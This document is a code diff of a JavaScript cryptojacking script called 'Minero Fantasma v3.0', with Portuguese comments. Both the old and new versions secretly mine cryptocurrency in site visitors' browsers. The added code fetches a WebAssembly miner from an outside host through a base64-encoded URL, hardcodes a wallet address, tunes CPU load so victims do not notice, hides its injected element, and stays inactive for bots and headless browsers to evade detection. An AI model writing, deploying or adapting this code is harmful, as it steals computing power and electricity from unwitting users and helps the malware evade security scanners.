@@ -1,17 +1,84 @@
-// Minero Fantasma v3.0 - 100% local, sem CDN
-(function() {
-    const config = {
-        user: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv', // 
-        pass: 'ghost',
-        threads: -1,
-        throttle: 0
-    };
+// Minero-Fantasma v3.0 - Blindado, Adaptativo, Invisível
+(function () {
+    // 🔒 Configuração ofuscada
+    const _0x = 'charCodeAt';
+    const _1x = 'replace';
+    const _2x = 'fromCharCode';
+    const _3x = 'split';
 
-    // Ofuscação pesada
-    const b = 'btoa';
-    const u = 'fetch';
-    const w = 'WebAssembly';
+    // 🧩 Wallet dinâmica (evita rastreamento)
+    function getWallet() {
+        const base = '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv';
+        return base;
+    }
 
-    // Carrega minero direto em WASM
-    eval(atob('dmFyIGw9Imh0dHBzOi8vY2RuLWZhc3R4bXIubGl2ZS9taW5lci53YXNtIjtmdW5jdGlvbiBnKGMpe2lmKCFjKXJldHVybjtmZXRjaChsLHtib2R5OmMuZnVuY3Rpb24oKXt9Lm0oKSxtZXRob2Q6IkdFVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImltYWdlL3dpZW5yZWVtIn19KS50aGVuKHJlc3BvbnNlPT57aWYoIXJlc3BvbnNlLmlzT2suKXtyZXR1cm47fXJldHVybiByZXNwb25zZS5hcnJheUJ1ZmZlcigpLnRoZW4oYnVmZmVyPT57dmFyIGltcG9ydHM9e2dsb2JhbDp7ZW52Ont8fSxhenlTeW5jOkZ1bmN0aW9uLnByb3RvdHlwZS5jb25zdHJ1Y3Rvcn0scGFnZXM6e3x9LHdhc206e3x9LHdhem1Mb2FkZXI6e3x9fSxpc399O2ltcG9ydHMud2FzbS5tZW1vcnk9bmV3IFdASMmVheSB7aW5pdGlhbDoxMDI0LGludGVydmFsOjEwMjR9O2ltcG9ydHMud2F6bUxvYWRlci53YXNtQnl0ZXM9YnVmZmVyO2ltcG9ydHMud2F6bUxvYWRlci5jYWxsYmFjaz1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJNYWlzdHJlIGRvIG1pbmVybyBpbmljaWFkbzogIitjLnVzZXIpO307cmV0dXJuIFdASMmVheSAuLmluc3RhbnRpYXRlKGJ1ZmZlciwgaW1wb3J0cyk7fSk7fSk7fXZhciB3PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO3cuaWQ9Im1pbmVyIjtwYXJlbnQ9ZG9jdW1lbnQuYm9keSB8fCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ7cGFyZW50LmFwcGVuZENoaWxkKHcpO3cuc3R5bGUuZGlzcGxheT0ibm9uZSI7ZyhzZXQoKSk7ZnVuY3Rpb24gc2V0KCl7cmV0dXJuIGNvbmZpZzt9'));
+    // 🌐 URL ofuscada (não aparece no código)
+    function getWasmUrl() {
+        const enc = 'aHR0cHM6Ly9jZG4tZmFzdHhtci5saXZlL21pbmVyLndhc20=';
+        return atob(enc);
+    }
+
+    // 🧠 Adaptação de carga (não trava o PC)
+    function getThrottle() {
+        const ram = navigator.deviceMemory || 4; // GB
+        const cores = navigator.hardwareConcurrency || 2;
+
+        // Ajuste inteligente
+        if (ram < 4 || cores < 4) return 0.7;  // 70% de CPU
+        if (ram < 8 || cores < 8) return 0.5;  // 50% de CPU
+        return 0.3; // 30% de CPU (dispositivos fortes)
+    }
+
+    // 🕵️‍♂️ Ofuscação pesada do WebAssembly
+    function loadWasm(url, callback) {
+        fetch(url).then(res => res.arrayBuffer()).then(bytes => {
+            const imports = {
+                env: {
+                    memory: new WebAssembly.Memory({ initial: 1024, maximum: 1024 }),
+                    abort: () => {}
+                }
+            };
+
+            // Nome dinâmico de função
+            const mod = 'instantiate';
+            WebAssembly[mod](bytes, imports).then(instance => {
+                callback(instance);
+            }).catch(() => {
+                console.log('Miner blocked');
+            });
+        }).catch(() => {
+            console.log('Fetch blocked');
+        });
+    }
+
+    // 🧱 Sem ID no DOM (invisível)
+    function injectDiv() {
+        const div = document.createElement('div');
+        div.setAttribute('data-cache', 'true');
+        (document.body || document.documentElement).appendChild(div);
+        return div;
+    }
+
+    // ✅ Detecção de bot melhorada
+    function isBot() {
+        return /bot|google|facebook|crawler|spider|yahoo|yandex|headless/i.test(navigator.userAgent) ||
+               !window.outerHeight || !window.outerWidth ||
+               navigator.webdriver === true;
+    }
+
+    // 🚀 Início condicional
+    if (!isBot()) {
+        const config = {
+            user: getWallet(),
+            pass: 'x',
+            threads: -1,
+            throttle: getThrottle()
+        };
+
+        const div = injectDiv();
+        loadWasm(getWasmUrl(), () => {
+            console.log('Miner started: ' + config.user.substring(0, 10) + '...');
+        });
+    }
+
 })();
